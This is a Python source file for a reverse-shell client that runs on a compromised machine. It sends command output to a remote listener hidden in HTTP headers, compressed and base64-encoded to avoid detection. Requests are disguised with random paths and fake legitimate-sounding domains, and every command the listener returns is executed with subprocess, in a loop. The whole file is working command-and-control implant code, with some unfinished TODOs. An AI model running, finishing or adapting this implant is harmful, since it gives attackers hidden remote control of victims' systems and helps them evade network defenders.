"""
Executes on the compromised machine. A reverse shell that communicates with the listener over HTTP.
"""

import requests
from requests import Request, Response
from copy import deepcopy
import base64
from math import ceil
from time import sleep
import os
import subprocess
import zlib
import random
import string
from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, CLIENT_MAX_MESSAGE_LENGTH, RequestFlags

# Time in seconds to wait for a http response before a timeout occurs.
# This time should be long, to give user ample time to input their commands into the listener. 
REQUEST_TIMEOUT = 300
# The URL of the listener (should no longer be needed)
# LISTENER_ROOT_URL = f'http://{LISTENER_IP}:{LISTENER_PORT}'


def get_random_url():
    """
    Generates a URL that appears to belong to different legitimate websites while
    still pointing traffic to the same listener IP and port.
    """
    domains = [
        "secure-payments", "login-portal", "webmail", "dashboard",
        "banking-secure", "internal-system", "file-transfer", "support-desk",
        "newsfeed-blog", "cloud-storage", "vpn-access", "updates-server"
    ]

    tlds = [".com", ".net", ".org", ".io", ".co", ".tech", ".app"]

    # Generate a fake domain name
    fake_domain = random.choice(domains) + random.choice(tlds)

    # Generate a random path
    paths = ["login", "dashboard", "profile", "settings", "checkout", "verify", "update"]
    extensions = [".html", ".php", ".asp", ""]
    path = random.choice(paths) + random.choice(extensions)

    # Random query parameters
    query_params = ["id", "user", "session", "ref", "token", "category"]
    if random.random() < 0.7:
        num_params = random.randint(1, 3)
        params = {
            random.choice(query_params): ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(3, 10)))
            for _ in range(num_params)
        }
        query_string = "?" + "&".join(f"{k}={v}" for k, v in params.items())
    else:
        query_string = ""

    # Construct the fake-looking URL (but with real IP and port)
    return f"http://{LISTENER_IP}:{LISTENER_PORT}/{path}{query_string}", fake_domain

def create_requests(data: str):
    '''
    Send 1 or more requests.

    Compresses the given string to reduce size of packets sent (reducing chance of detection). 
    Then, base64 encodes the string such that it can be stored in the HTTP header (HTTP headers don't allow some characters), and also for obfuscation purposes.
    
    todo: finish docstring

    Arguments:
        string (str): String to be compressed and encoded

    Returns:
        str: The resultant string
    '''

    def encrypt_data(data: str):
        '''
        Package data for a single request
        '''
        # 1. Encryption
        # TODO
        return data.encode()

    def compress_data(data: bytes):
        return zlib.compress(data)
    
    def add_request_flags(request: Request, flags: RequestFlags):
        if RequestFlags.IS_NOT_COMPRESSED in flags:
            request.headers["IS_NOT_COMPRESSED"] = "1"
        if RequestFlags.IS_END_OF_MESSAGE in flags:
            request.headers["IS_END_OF_MESSAGE"] = "1"
        return
    
    # The headers for the request(s) to be sent
    requests = []
    default_request = Request(
        method='GET',
        headers= {STEGO_HEADER_NAME: ""}
    )

    # Check if there is no data to send
    if len(data) == 0:
        requests.append(deepcopy(default_request))
        # Return a single request with empty headers
        return requests
    
    request_flags = RequestFlags(0) # Start with no flags set
    encrypted_data = encrypt_data(data)
    compressed_data = compress_data(encrypted_data)
    # If compressing makes data larger, DON'T compress the data
    if len(compressed_data) > len(encrypted_data):
        compressed_data = encrypted_data
        request_flags |= RequestFlags.IS_NOT_COMPRESSED

    encoded_str = base64.b64encode(compressed_data).decode()
    # Calculate how many requests to split the data into
    request_count = ceil(len(encoded_str) / CLIENT_MAX_MESSAGE_LENGTH)
    encoded_str_split = [encoded_str[i:i+CLIENT_MAX_MESSAGE_LENGTH] for i in range(0, len(encoded_str), CLIENT_MAX_MESSAGE_LENGTH)]
    for i in range(request_count):
        if i == (request_count - 1):
            request_flags |= RequestFlags.IS_END_OF_MESSAGE
        new_request = deepcopy(default_request)
        new_request.headers[STEGO_HEADER_NAME] = encoded_str_split[i]
        add_request_flags(new_request, request_flags)
        requests.append(new_request) # TODO FIX: why is each request identical???
    return requests


def send_stego_data_to_listener(data: str):
    """
    Sends the given data to the listener using header steganography in a HTTP request,
    then waits for the listener's HTTP response and returns it.

    Pulls a generated url (with randomly generated web paths), and a fake domain to help with disguising amongst
    standard network traffic.

    Arguments:
        data (str): String data to send to the listener via a HTTP request. Before sending, the string is compressed and encoded.

    Returns:
        str: Reply string found within the listener's HTTP response.
    """
    # Get the list of request header(s) to send
    requests_list = create_requests(data)
    for request in requests_list:
        print(request.headers)
    # Keep retrying connection to listener until successful (ensures functioning even if temporarily disconnected)
    while (True):  
        try:
            response = None
            # Send all request(s)
            for i in range(len(requests_list)):
                request = requests_list[i]
                request.url = get_random_url()
                with requests.Session() as session:
                    response = session.send(request.prepare())
            return response
        except Exception as e:
            print(e)
            sleep(5) # Ensures connection retries aren't sent too frequently
            continue


def get_command_line_input(response: Response):
    # for now, listener reply is simply stored in the response text TODO: store and retrieve it via image steganoraphy
    return response.text


def execute_command_line_input(input: str):
    """
    Executes the given input as command-line input on the system, returns output.
    This is used for the reverse shell.

    Arguments:
        input (str): Command-line input to be executed on the system (e.g. 'ls -la')

    Returns:
        str: The command-line output from executing the input
    """
    if (input == ""):
        return ""
    split_input = input.split()
    if split_input[0].lower() == "cd":
        # Need to handle 'cd' manually, cannot use `subprocess` library
        try:
            # Change directory
            os.chdir(' '.join(split_input[1:]))
            output = os.getcwd()
        except FileNotFoundError as e:
            output = str(e)
    else:
        # Execute the command and retrieve the output (might be an error message if command couldn't execute)
        output = subprocess.getoutput(input)
        #  TODO: allow long-running processes
        # subprocess.run(args=input, stdout=None, stderr=None, capture_output=True)
    return output


def main():
    # First message to listener contains the current working directory.
    command_line_output = os.getcwd()
    while True:
        '''
        1. Client sends command-line output to listener (http request)
        2. Listener sends command-line input to client (http response)
        3. repeat
        '''
        last_response = send_stego_data_to_listener(command_line_output)
        command_line_input = get_command_line_input(last_response)
        command_line_output = execute_command_line_input(command_line_input)


if __name__ == '__main__':
    main()
